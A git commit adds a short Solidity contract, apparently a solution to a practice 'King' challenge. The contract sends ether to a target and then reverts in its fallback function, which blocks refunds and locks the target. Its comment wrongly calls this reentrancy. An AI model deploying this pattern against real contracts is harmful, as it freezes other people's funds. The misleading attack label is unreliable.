9ecbf13a818ef244677ac6e4f07bf9a2e74f815d
Gakarot <startradingcentre@gmail.com>
2025-05-12 18:25:13 +0530

    Update solution.sol

--- Challenge_10_King/solution.sol
+++ Challenge_10_King/solution.sol
@@ -1,1 +1,14 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
+// Reentrancy attack.
+
+contract Attack {
+
+    constructor(address _target) payable {
+        address(_target).call{value:msg.value}("");
+    }
+
+    fallback() external payable { revert ("Bitch"); }
+
+}
